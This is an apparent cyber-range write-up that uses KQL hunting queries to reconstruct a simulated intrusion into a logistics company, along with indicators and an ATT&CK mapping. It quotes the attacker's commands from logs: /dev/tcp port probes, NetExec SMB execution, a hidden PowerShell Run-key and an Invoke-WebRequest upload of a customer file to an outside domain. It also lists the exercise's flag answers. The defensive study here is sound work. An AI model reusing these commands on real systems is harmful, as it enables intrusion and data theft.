# Incident Report: Northpeak Descent Intrusion
**Dates:** July 12, 2026 (Section 1) · October 29, 2026 (Sections 2–5) | **Author:** Danielle Respes | **Range:** LOG(N) Pacific Cyber Range

## Executive Summary

*Status: All five sections solved, 19 flags.* Someone gained unauthorized access to the Northpeak Logistics estate on the evening of June 16, 2026, across a mixed Windows and Linux environment. This report captures my investigative steps, the hurdles I hit, and the process I'm using to learn KQL and threat hunting.

**The short version:** nothing was exploited and nothing was disabled. The operator logged in over RDP with a valid admin account (`sancadmin`) from `148.64.103.173` (workstation `loranse`), landed on the Windows workstation first, used the Linux host to stage NetExec and pivot back into Windows over SMB, planted an HKCU Run key disguised as a "NorthpeakSync" tray script, beaconed to three look-alike `sync-northpeak.com` subdomains, and finally uploaded a customer data export from the file server. Every step used valid credentials and built-in tooling, which is why nothing tripped.

| Section | Theme | Flags |
|---|---|---|
| 1 | Initial Access | Q01–Q04 |
| 2 | Linux Recon | Q05–Q07 |
| 3 | Pivot & Persistence | Q08–Q10 |
| 4 | Command & Control | Q11–Q15 |
| 5 | Impact / Exfiltration | Q16–Q19 |

## Methodology

I use an AI assistant as a tutor to help me understand KQL syntax. It helps me learn the how and why behind the commands, which I then validate and interpret myself. My syntax notes and dead ends are in [kql-learning-log.md](./kql-learning-log.md).

**How Sections 2–5 were different:** I came back to this hunt in October and worked Sections 2–5 in one sitting with much heavier AI help than Section 1. For most of those flags the AI drafted the query and the first read of the results; I ran every query in Sentinel, brought the results back, and submitted. I've marked that honestly on each question. The places where the AI guessed wrong before the data corrected it are kept in, because those were the most useful lessons.

---


## Q00: Baseline and Setup

Before hunting anything, I confirmed I was on the right workspace and could query it. One scoped count proved three things at once: access, a working host filter, and real data in the intrusion window.

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-06-16 18:00) .. datetime(2026-06-17 02:00))
| where DeviceName has_any ("npt-ws01","npt-srv01","npt-linux01")
| summarize Events = count() by DeviceName
```

**Gate phrase submitted:** `Northpeak hunter ready`

<img width="945" height="765" alt="process-events-by-host-pie" src="https://github.com/user-attachments/assets/848949da-2bd5-4312-987f-fcb2f82493e9" />

**What I noticed:** the two Windows hosts sit near 1,050 events each, but npt-linux01 carries about 7x that, roughly 78% of all process telemetry.

**Note:** high volume alone doesn't confirm compromise. The Linux count could be normal activity or the attacker's work. I'm treating it as a lead for Q02, not a conclusion.

---

## Q01: Initial Access

The alerts are full of failed logins, so it looks like brute force. But the brief said not to trust that, and it was right. The real entry logged in cleanly and never set off an alarm. So I stopped looking at the failures and went looking for the login that worked, from outside.

**Question:** which logins worked, from an address outside the estate?

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2026-06-16 18:00) .. datetime(2026-06-17 02:00))
| where DeviceName has_any ("npt-ws01","npt-srv01","npt-linux01")
| where ActionType == "LogonSuccess"
| where LogonType == "RemoteInteractive"
| project AccountName, ActionType, DeviceName, InitiatingProcessFolderPath, LogonType, RemoteIP, RemoteIPType
```

**What I found:**

- **Source IP:** `148.64.103.173`. RemoteIPType is `Public`, so it's from outside. That's the way in.
- **Account:** `sancadmin`, a real admin account. Nothing was hacked; they just logged in with valid credentials.
- **How:** LogonType is `RemoteInteractive` on the Windows hosts, which means RDP.

**How I got there:** I started with the same base as Q00 (table, time, host), then added `LogonSuccess` to drop the failed logins, checked `RemoteIPType` to confirm the source was outside, and used `LogonType` to find the method (RDP). I used one of the two hints (15 points) for the "it's a decoy, look at what succeeded" and I want to get to that on my own next time.

**Q01 answer:** `148.64.103.173, RDP`

---

## Q02: Which Foothold Came First

The obvious story, and the pie chart, both point to Linux. npt-linux01 has about 78% of all the process events, so it looks like the center of everything. The brief warned me not to trust that and to prove the order myself. Volume isn't order, so I put all three hosts on one timeline and let the timestamps decide.

<img width="612" height="355" alt="Screenshot 2026-07-12 at 2 25 35 PM" src="https://github.com/user-attachments/assets/2a2a525d-7257-49c9-9daf-3222f0f1cb61" />



**Question:** which host was accessed from outside first?

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2026-06-16 18:00) .. datetime(2026-06-17 02:00))
| where DeviceName has_any ("npt-ws01","npt-srv01","npt-linux01")
| where ActionType == "LogonSuccess"
| where RemoteIPType == "Public"
| project TimeGenerated, DeviceName, AccountName, RemoteIP, LogonType
| sort by TimeGenerated asc
```

**What I changed from Q01:** I dropped the `LogonType == "RemoteInteractive"` filter. RDP logs as RemoteInteractive, which is a Windows thing, so keeping it would have hidden the Linux host completely and I'd have "proven" Windows first by accident. To compare the two platforms fairly, I filtered on external access (`RemoteIPType == Public`) instead of a Windows-only logon type, then sorted by time so the earliest access is the top row.

**What I found:** earliest external login from `148.64.103.173` (account `sancadmin`) on each host:

- **npt-ws01 (Windows): 20:57:54**
- npt-srv01 (Windows): 21:58:03
- **npt-linux01 (Linux): 22:01:38**

The first foothold was npt-ws01 at 20:57:54, over an hour before Linux was touched at 22:01:38. So Windows came first, not Linux. Same attacker on both (same account, same IP), just different platforms and different arrival times.

**Note on logon types:** npt-ws01 shows Network logins at 20:57:54 immediately followed by RemoteInteractive at 20:58:02, same IP. That's one RDP connection establishing: the network auth lands first, then the interactive session opens. The Linux logins are Network type, not RemoteInteractive. Both count as successful remote access from outside; the type just describes how each session authenticated.

**What this proves:** volume is not order. Linux looked central because it's noisy, but the timestamps show the operator started on the Windows workstation and reached Linux later. This is the "don't assume Linux first" trap the brief set, and the two timestamps side by side disprove it.

**Hint used:** 1 of 2 (25 points). The hint said to find the earliest external access on each host and not stay on one platform.

**Assistance:** I worked out the query approach for this one with my AI tutor, specifically dropping the Windows-only `RemoteInteractive` filter and comparing on external access instead. The reasoning about what the result meant, that Windows came before Linux and why volume isn't order, is my own.

**Q02 answer:** `npt-ws01, 148.64.103.173`

---


## Q03: Operator Workstation Name

The lead said the operator was sloppy: something they connected with announced itself on every remote session, and I needed to name it. The answer format was a hostname, so I was looking for a machine name, not an IP or a tool.

**My first read (and where it went wrong):** I thought "something they connected with" meant a tool or process the attacker used to connect, so I went back to my logon results and looked at the process column. I found `svchost.exe -k netsvcs` running under sancadmin. But svchost.exe is a native Windows process, it runs on every Windows machine, so it wasn't an attacker tool. Dead end. That result plus the `hostname` answer format told me I was looking for a machine name, not a process.

**Syntax I fixed along the way:**
- I first wrote `LogonType == "remoteinteractive"` in lowercase and got nothing. KQL matches string values exactly, so it had to be `"RemoteInteractive"` with the right capitals.
- I wrote `RemoteIP == 148.64.103.173"` and it wouldn't run, I'd dropped the opening quote and had spacing issues on the `where` lines. Fixed to `"148.64.103.173"` with clean spacing.

**The query I typed to work the attacker's sessions** (after the fixes above):

```kql
DeviceLogonEvents
|where TimeGenerated between (datetime(2026-06-16 18:00) .. datetime(2026-06-17 02:00))
|where DeviceName has_any ("npt-ws01","npt-srv01","npt-linux01")
|where ActionType == "LogonSuccess"
|where LogonType == "RemoteInteractive"
|where RemoteIP == "148.64.103.173"
|project AccountName, ActionType,DeviceName, InitiatingProcessFolderPath,LogonType,RemoteIP,RemoteIPType
```

This is where I saw `svchost.exe` in the process column and ruled it out. But it didn't surface the workstation name, because this query filters to `RemoteInteractive` only, and the name rides in on the Network logon rows.

**Hint used:** 1 of 2 (15 points). "Their inbound sessions carried more than an address." That confirmed the answer was the name of the remote machine riding in alongside the IP, not a process.

**The query that found it** (worked out with my AI tutor):

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2026-06-16 18:00) .. datetime(2026-06-17 02:00))
| where RemoteIP == "148.64.103.173"
| where ActionType == "LogonSuccess"
| distinct RemoteDeviceName
```

`distinct` was new syntax for me. It collapses a column down to just its unique values, so instead of hundreds of session rows I got a short list: a blank, and `loranse`.

**What I found:** `loranse`. It isn't one of the Northpeak hosts (npt-ws01, npt-srv01, npt-linux01), so it's a foreign machine name that rode in on the attacker's sessions from 148.64.103.173. That's the operator's own workstation, leaking its name on every connection.

**Note, two queries for two questions:** My earlier logon query kept `LogonType == "RemoteInteractive"`, which was right for finding the RDP method. But when I added `distinct RemoteDeviceName` to that same filtered query, it returned empty. The hostname is recorded on the Network logon rows, not the RemoteInteractive ones, so the interactive filter hid it. Dropping that filter returned the name. Lesson: a filter that's correct for one question can hide the answer to the next. This is the second time an over-specific RemoteInteractive filter cost me data (it also hid Linux in Q02).

**Q03 answer:** `loranse`

---

## Q04: srv01 Access Vector

The lead said the server "took its own way in, it wasn't reached from inside." So npt-srv01 wasn't pivoted to from another host, it had its own external login. I reconstructed it. Did this one solo, no hints.

**Question:** how was npt-srv01 accessed from outside, method, source, and session type?

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2026-06-16 18:00) .. datetime(2026-06-17 02:00))
| where DeviceName == "npt-srv01"
| where ActionType == "LogonSuccess"
| where RemoteIPType == "Public"
| project TimeGenerated, DeviceName, AccountName, RemoteIP, LogonType, RemoteDeviceName
| sort by TimeGenerated asc
```

**How I built it:** I reasoned "not reached from inside, so it had to be public," scoped to `npt-srv01`, filtered on `RemoteIPType == "Public"` and `LogonSuccess`, then projected the columns I needed.

**The real thinking, three values in one column:** the `LogonType` column had three values: `RemoteInteractive`, `Network`, and `Unlock`. I had to work out which one was the actual access vector:
- `Network` is the credential-check handshake.
- `Unlock` is reopening an already-open session.
- `RemoteInteractive` is a hands-on remote desktop session opening, that's the way in.

So the vector is `RemoteInteractive` (RDP), from 148.64.103.173.

**A mistake I caught myself:** I first put RDP in the logon_type slot. But RDP is the method, and `RemoteInteractive` is the logon_type, they're not the same thing. RDP is what I call it, RemoteInteractive is what the log calls it. Fixed the order to match the format.

**Corroboration I went looking for:** I added `RemoteDeviceName` to check for `loranse` (the operator workstation from Q03), but it was empty for these sessions. So my answer rested on a single signal: the matching IP plus my reasoning about the logon type. It was right, but that was my best judgment, not a locked-down confirmation. Lesson: when the field I want to corroborate with is blank, find a different corroborator rather than settling for one signal.

**Q04 answer:** `RDP, 148.64.103.173, RemoteInteractive`

---

# Section 2: Linux Recon

Once the operator reached `npt-linux01` (22:01), they used it as a workbench: check what they could escalate with, check whether the Windows boxes were reachable, then install a tool to go after them.

## Q05: Sudo Enumeration

**Question:** what was the first thing they ran to check what they could escalate with? They fumbled it once.

```kql
DeviceProcessEvents
| where DeviceName startswith "npt-linux01"
| where Timestamp between (datetime(2026-06-16 22:00) .. datetime(2026-06-17 00:30))
| where ProcessCommandLine has_any ("sudo", "sduo", "suod")
| project Timestamp, AccountName, ProcessCommandLine
| order by Timestamp asc
```

**What I found:**

- **22:11:28** `sudo -1`: the fumble, a digit one where a lowercase L should be
- **22:16:52** `sudo -l`: the real attempt, about five minutes later

A typo followed by a correction is a human at a keyboard, not a script. That's the "manual-operation fingerprint" the hint pointed at.

**Q05 answer:** `sudo -l`

## Q06: Reachability Technique

**Question:** how did they check the Windows hosts were reachable without dropping a tool, and which port did they care about?

```kql
DeviceProcessEvents
| where DeviceName startswith "npt-linux01"
| where Timestamp between (datetime(2026-06-16 22:00) .. datetime(2026-06-17 00:30))
| where ProcessCommandLine has_any ("/dev/tcp", "/dev/udp", "nc ", "timeout")
| project Timestamp, AccountName, ProcessCommandLine
| order by Timestamp asc
```

**What I found:**

- **22:21:28** `timeout 2 bash -c "echo > /dev/tcp/10.2.0.10/3389"`
- **22:21:28** `bash -c "echo > /dev/tcp/10.2.0.20/3389"`

Bash's built-in `/dev/tcp` opens a TCP socket with nothing installed. They tested RDP (3389) on two internal Windows hosts.

**A wrong guess the data corrected:** before running the query, the AI guessed 445 (SMB) or 5985 (WinRM) because a pipx install came next. The data said 3389. Lesson: don't answer from a story, answer from the rows.

**Q06 answer:** `/dev/tcp, 3389`

## Q07: Operator Tooling

**Question:** they checked for a couple of capabilities, then installed one tool. Name it.

I pulled every `sancadmin` command on Linux after 22:25 and filtered the export for `which`, `pipx` and `install`.

**What I found:**

| Time | Command | Meaning |
|---|---|---|
| 22:25:17 | `which xfreerdp rdesktop xfreerdp3` | looking for an RDP client (never installed) |
| 22:27:55 | `which nxc netexec crackmapexec` | looking for an AD tool |
| 22:28–22:29 | `sudo apt-get install -y pipx` | installing the installer |
| 22:29:16 | `pipx install netexec` | first attempt |
| 22:30:06 | `pipx install netexec --pip-args=--pre` | retry |
| 22:30:16 | `pipx install git+https://github.com/Pennyw0rth/NetExec.git` | installed from source |
| 22:31:09 | `nxc --version` | confirmed it works |

**Q07 answer:** `netexec`

---

# Section 3: Pivot & Persistence

## Q08: Lateral Movement Triple

**Question:** they came back at the workstation from inside the network. Account, internal source, target.

The same Linux export showed the next step:

- **22:32:17** `nxc smb 10.2.0.10 -u sancadmin -p ****`: testing the credential over SMB
- **22:37:13** `nxc smb 10.2.0.10 ... -x "whoami /all"`: remote command execution

That gave me the target IP and account, but not the Linux box's own internal IP. For that I went to the Windows side:

```kql
DeviceLogonEvents
| where DeviceName startswith "npt-ws01"
| where Timestamp between (datetime(2026-06-16 22:30) .. datetime(2026-06-16 22:45))
| where AccountName =~ "sancadmin"
| where ActionType == "LogonSuccess"
| project Timestamp, DeviceName, AccountName, RemoteIP, RemoteDeviceName, LogonType
| order by Timestamp asc
```

**What I found:** Network logons on `npt-ws01` from **`10.2.0.30`** at 22:32:18 and 22:37:14, each one second after the matching `nxc` command on Linux. So `10.2.0.30` is the Linux host and `10.2.0.10` is `npt-ws01`.

**Correlating across platforms:** matching timestamps on two different hosts' telemetry is what proves this is one action seen from both ends.

**Q08 answer:** `sancadmin, 10.2.0.30, npt-ws01`

## Q09: Operator PowerShell Lineage

**Question:** the workstation is drowning in PowerShell. What gives the human away?

Instead of reading every command, I grouped PowerShell by what launched it:

```kql
DeviceProcessEvents
| where DeviceName startswith "npt-ws01"
| where Timestamp between (datetime(2026-06-16 20:00) .. datetime(2026-06-17 00:30))
| where FileName in~ ("powershell.exe", "pwsh.exe")
| summarize Count = count(), FirstSeen = min(Timestamp), Accounts = make_set(AccountName), Sample = take_any(ProcessCommandLine)
    by InitiatingProcessFileName
| order by Count desc
```

**What I found:**

| Parent | Count | Accounts | What it is |
|---|---|---|---|
| powershell.exe | 14 | sancadmin, system | the hidden `NorthpeakSyncTray.ps1` (see Q10) |
| senseir.exe | 13 | system, local service | Defender for Endpoint |
| gc_worker.exe | 10 | system | Azure Guest Configuration |
| cmd.exe | 8 | system | MDE extension handler |
| **explorer.exe** | **3** | **sancadmin** | **a bare `"powershell.exe"`, opened from the desktop** |
| compattelrunner.exe | 2 | system | Windows telemetry |

The only PowerShell started from `explorer.exe` was `sancadmin` opening a console by hand during their RDP session.

**Q09 answer:** `explorer.exe`

## Q10: Persistence Full Command

**Question:** they tested their staging script, then made it survive a reboot. Give the full command.

The top row in Q09, `NorthpeakSyncTray.ps1` running hidden, was the lead. The hint said logon persistence in the user's own profile, so I looked at Run keys:

```kql
DeviceRegistryEvents
| where DeviceName startswith "npt-ws01"
| where Timestamp between (datetime(2026-06-16 20:00) .. datetime(2026-06-17 00:30))
| where RegistryKey has @"\CurrentVersion\Run"
| where ActionType in ("RegistryValueSet", "RegistryKeyCreated")
| project Timestamp, InitiatingProcessAccountName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessCommandLine
| order by Timestamp asc
```

**What I found:** at **23:04:16**, `sancadmin` wrote:

- **Key:** `HKEY_CURRENT_USER\S-1-5-21-...-500\Software\Microsoft\Windows\CurrentVersion\Run`
- **Value name:** `NorthpeakSyncTray`, made to look like a company sync tool
- **Data:** the command below
- **Written by:** the explorer-launched console from Q09

**My mistake:** my first submission was marked wrong because I'd typed it with a curly quote (`“`) and dropped the closing quote. Copying straight from the result fixed it. Lesson: copy exact strings from the query output, never retype them.

**Q10 answer:** `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\ProgramData\Northpeak\NorthpeakSync\Bin\NorthpeakSyncTray.ps1"`

---

# Section 4: Command & Control

## Q11: Beacon Domains, Cross-Source

**Question:** the channel used three look-alike subdomains but the network table only caught one. Find all three in order, and say where the other two were hiding.

DeviceNetworkEvents for the window was almost all SmartScreen and certificate traffic, plus one odd entry: **`status.sync-northpeak.com`** from `powershell.exe` (ConnectionFailed, 23:16:29). With the parent domain known, I searched every table for it:

```kql
search in (DeviceProcessEvents, DeviceEvents, DeviceFileEvents, DeviceRegistryEvents, DeviceNetworkEvents)
    "sync-northpeak"
| where Timestamp between (datetime(2026-06-16 20:00) .. datetime(2026-06-17 00:30))
| where DeviceName startswith "npt-"
| project Timestamp, $table, DeviceName, ActionType, ProcessCommandLine, InitiatingProcessCommandLine, RemoteUrl, AdditionalFields
| order by Timestamp asc
```

**What I found:**

| Order | Domain | First seen | In network telemetry? |
|---|---|---|---|
| 1 | `status.sync-northpeak.com` | 23:15:47 | yes, the only one |
| 2 | `updates.sync-northpeak.com` | 23:15:49 | no, process command lines only |
| 3 | `cdn.sync-northpeak.com` | 23:19:23 | no, hidden inside a Base64 `-EncodedCommand` |

**Q11 answer:** `status.sync-northpeak.com, updates.sync-northpeak.com, cdn.sync-northpeak.com; DeviceProcessEvents`

## Q12: Encoded Beacon Decode

The wrapped beacon ran at 23:19:23, 23:22:56 and 23:28:48 as `powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBr...`.

**The trick:** PowerShell's `-EncodedCommand` is Base64 of **UTF-16LE**, not ASCII. Decoding it as ASCII leaves a null byte between every character. Decoding Base64, then UTF-16LE (CyberChef: From Base64 → Decode text UTF-16LE) gives:

```
Invoke-WebRequest -Uri "https://cdn.sync-northpeak.com/api/beacon?id=NPT-WS01&flag=NORTHPEAK-09" -UseBasicParsing -TimeoutSec 4
```

The `PowerShellCommand` events in DeviceEvents already hold the decoded text in `AdditionalFields.Command`, which is a useful shortcut.

**Q12 answer:** the decoded command above (beacon URL `https://cdn.sync-northpeak.com/api/beacon?id=NPT-WS01&flag=NORTHPEAK-09`)

## Q13: Encoded-Command Discrimination

**Question:** most encoded PowerShell is innocent chatter. What's generating it?

The Q09 lineage table already answered this: `gc_worker.exe` launched PowerShell 10 times as SYSTEM with `-encodedCommand`. That's the Azure Guest Configuration agent running compliance checks. The operator's encoded commands ran as `sancadmin` from the interactive console. The hint said to separate them by who ran them, not what the command said, and that's exactly what grouping by parent and account does.

**Q13 answer:** `gc_worker.exe`

## Q14: Beacon Rhythm

**Question:** look at the spacing of the early check-ins to the first domain. What does the rhythm prove?

```kql
union withsource=TableName DeviceProcessEvents, DeviceEvents, DeviceNetworkEvents
| where DeviceName startswith "npt-"
| where Timestamp between (datetime(2026-06-16 20:00) .. datetime(2026-06-17 00:30))
| where ProcessCommandLine has "status.sync-northpeak"
    or InitiatingProcessCommandLine has "status.sync-northpeak"
    or RemoteUrl has "status.sync-northpeak"
    or tostring(AdditionalFields) has "status.sync-northpeak"
| summarize by Timestamp = bin(Timestamp, 1s), TableName, InitiatingProcessFileName
| order by Timestamp asc
| extend GapSec = datetime_diff('second', Timestamp, prev(Timestamp))
```

**Where I went wrong first:** we focused on the 38-second gap between the two rounds, plus the hand-edited timeout (3 to 4), and concluded "irregular, human operator." That was marked wrong twice. I took Hint 2 (−15 pts), which said to look at how *consistent* the earliest timing was.

**What the consistency showed:**

| Time | Domain | Gap |
|---|---|---|
| 23:15:47.040 | status | |
| 23:15:49.047 | updates | +2.007s |
| 23:16:25.487 | status | |
| 23:16:27.501 | updates | +2.014s |

The status→updates spacing repeats to within milliseconds. A person can't do that; a script with a fixed sleep can.

**Lesson:** I mixed up two questions, "who started this?" (the operator) and "what's spacing the check-ins?" (a script). Both can be true at once.

**Q14 answer:** `fixed interval, scripted automation`

## Q15: DNS Detection Indicator

General knowledge rather than a query. The DNS record property that, set very low, signals dynamic DNS / fast-flux C2 is **TTL** (Time To Live). A low TTL forces resolvers to re-query often, so the operator can rotate IPs and an IP block stops working almost immediately.

**Q15 answer:** `TTL`

---

# Section 5: Impact

## Q16: Crown Jewel Exfil

The `sync-northpeak` search from Q11 had already surfaced the last outbound action, on the server:

```
23:44:08  npt-srv01  powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest
  -Uri 'https://cdn.sync-northpeak.com/api/upload?host=NPT-SRV01&data=customers'
  -InFile 'C:\temp\customer_data_export_20260616.csv' -UseBasicParsing -TimeoutSec 5
```

File, host and destination are all in one command line. The upload went to the same `cdn` subdomain as the encoded beacon.

**Q16 answer:** `customer_data_export_20260616.csv, npt-srv01, cdn.sync-northpeak.com`

## Q17: Exfil Session Correlation

**Question:** there were two remote sessions on the server. Which one was the export in?

```kql
DeviceLogonEvents
| where DeviceName startswith "npt-srv01"
| where Timestamp between (datetime(2026-06-16 20:00) .. datetime(2026-06-17 00:30))
| where AccountName =~ "sancadmin"
| where LogonType in ("RemoteInteractive", "Unlock", "Interactive")
   or RemoteIP == "148.64.103.173"
| project Timestamp, ActionType, LogonType, RemoteIP, RemoteDeviceName, LogonId
| order by Timestamp asc
```

**What I found:**

- **Session 1:** 21:58:03 Network → 21:58:08 RemoteInteractive (LogonId 4039013)
- **Session 2:** 23:42:45 Network from `loranse` → 23:42:52 RemoteInteractive → 23:42:52 **Unlock** (LogonId 9592297)
- **Export:** 23:44:08, about 76 seconds after the second session unlocked

They reconnected to a locked desktop, uploaded the file and left. It's the same reconnect-and-unlock pattern they used on `npt-ws01` at 22:42.

**Q17 answer:** `the second authenticated session`

## Q18: Holding the Ground

**Question:** they were hands-on for hours and nothing tripped. They didn't tear down the defenses. What was the model?

**Reasoning from absence:** nothing in the whole investigation touched Defender or MDE. The sensor logged the operator from start to finish, which is the only reason this report exists. What they used instead:

- **Valid accounts:** `sancadmin` everywhere, clean RDP logons, no exploits
- **Built-in tools:** bash `/dev/tcp`, the PowerShell console, `Invoke-WebRequest`, `whoami`/`findstr`, and an HKCU Run key instead of a service or dropped implant

The one tool they did install (NetExec) went onto the Linux box, not the Windows hosts.

**Q18 answer:** `no defense tampering, valid accounts and living off the land`

## Q19: Confirming the Foothold's Rights

**Question:** when the operator came back into the workstation, what were they confirming about their own account?

```kql
union withsource=TableName DeviceProcessEvents, DeviceEvents
| where DeviceName startswith "npt-ws01"
| where Timestamp between (datetime(2026-06-16 22:42) .. datetime(2026-06-16 23:05))
| where AccountName =~ "sancadmin" or InitiatingProcessAccountName =~ "sancadmin"
| where ProcessCommandLine has_any ("whoami", "net ", "S-1-5", "findstr", "Select-String")
| project Timestamp, TableName, ProcessCommandLine
| order by Timestamp asc
```

**What I found:** right after the 22:42 re-entry, a burst within 60 milliseconds:

1. 22:43:04.041 `whoami.exe`
2. 22:43:04.074 `whoami.exe /groups`
3. 22:43:04.095 `findstr.exe /i S-1-5-32-544`

`S-1-5-32-544` is the well-known SID for the built-in local **Administrators** group. They were confirming `sancadmin` was a local admin before planting persistence 20 minutes later.

**Q19 answer:** `local administrators group membership`

---

# Full Attack Timeline (UTC, 16 June 2026)

| Time | Host | Event | Flag |
|---|---|---|---|
| 20:57:54 | npt-ws01 | First foothold: external RDP, `sancadmin` from `148.64.103.173` (`loranse`) | Q01–Q03 |
| 21:54:45 | npt-ws01 | First hands-on PowerShell console from `explorer.exe` | Q09 |
| 21:58:08 | npt-srv01 | Server session 1: external RDP (RemoteInteractive) | Q04, Q17 |
| 22:01:38 | npt-linux01 | Linux accessed, over an hour after Windows | Q02 |
| 22:11:28 | npt-linux01 | `sudo -1` (typo), then `sudo -l` at 22:16:52 | Q05 |
| 22:21:28 | npt-linux01 | `/dev/tcp` checks on 3389 against 10.2.0.10 and 10.2.0.20 | Q06 |
| 22:25–22:31 | npt-linux01 | Checks for RDP client and AD tool; installs NetExec | Q07 |
| 22:32:17 | npt-linux01 → npt-ws01 | `nxc smb 10.2.0.10` as `sancadmin` from 10.2.0.30 | Q08 |
| 22:37:13 | npt-linux01 → npt-ws01 | `nxc ... -x "whoami /all"` | Q08 |
| 22:42:36 | npt-ws01 | Operator returns over RDP, Unlock | Q19 |
| 22:43:04 | npt-ws01 | `whoami` → `whoami /groups` → `findstr S-1-5-32-544` | Q19 |
| 23:04:16 | npt-ws01 | HKCU Run key `NorthpeakSyncTray` planted | Q10 |
| 23:15:47 | npt-ws01 | First beacons: `status` then `updates` 2s apart | Q11, Q14 |
| 23:16:29 | npt-ws01 | Only network-logged beacon (`status`, ConnectionFailed) | Q11 |
| 23:19:23 | npt-ws01 | Encoded beacon to `cdn.sync-northpeak.com` (repeats 23:22, 23:28) | Q11, Q12 |
| 23:42:52 | npt-srv01 | Server session 2: RDP back in, Unlock | Q17 |
| 23:44:08 | npt-srv01 | `customer_data_export_20260616.csv` uploaded to `cdn.sync-northpeak.com` | Q16 |

# Indicators of Compromise

| Type | Indicator | Notes |
|---|---|---|
| IP (external) | `148.64.103.173` | operator source for every RDP session |
| Hostname | `loranse` | operator workstation, leaked in RemoteDeviceName |
| Account | `sancadmin` | valid admin account used throughout |
| IP (internal) | `10.2.0.30` | npt-linux01, pivot source |
| Domain | `status.sync-northpeak.com` | C2 check-in |
| Domain | `updates.sync-northpeak.com` | C2 check-in |
| Domain | `cdn.sync-northpeak.com` | encoded beacon and exfil destination |
| File | `C:\ProgramData\Northpeak\NorthpeakSync\Bin\NorthpeakSyncTray.ps1` | persistence script |
| Registry | `HKCU\...\CurrentVersion\Run\NorthpeakSyncTray` | logon persistence |
| File | `C:\temp\customer_data_export_20260616.csv` | exfiltrated data |
| Tool | NetExec (`nxc`) | installed via pipx on npt-linux01 |

# MITRE ATT&CK Mapping

| Technique | Name | Where |
|---|---|---|
| T1078 | Valid Accounts | `sancadmin` throughout |
| T1021.001 | Remote Services: RDP | external entry to ws01 and srv01 |
| T1046 | Network Service Discovery | `/dev/tcp` checks on 3389 |
| T1069.001 | Permission Groups Discovery: Local Groups | `whoami /groups \| findstr S-1-5-32-544` |
| T1588.002 | Obtain Capabilities: Tool | NetExec via pipx |
| T1059.001 | Command and Scripting Interpreter: PowerShell | console, beacons, exfil |
| T1547.001 | Registry Run Keys / Startup Folder | `NorthpeakSyncTray` Run key |
| T1132.001 | Data Encoding: Standard Encoding | Base64 `-EncodedCommand` |
| T1027 | Obfuscated Files or Information | encoded beacon |
| T1568 | Dynamic Resolution | look-alike subdomains, low-TTL indicator |
| T1573 | Encrypted Channel | HTTPS beacons |
| T1567 | Exfiltration Over Web Service | upload to `cdn.sync-northpeak.com` |
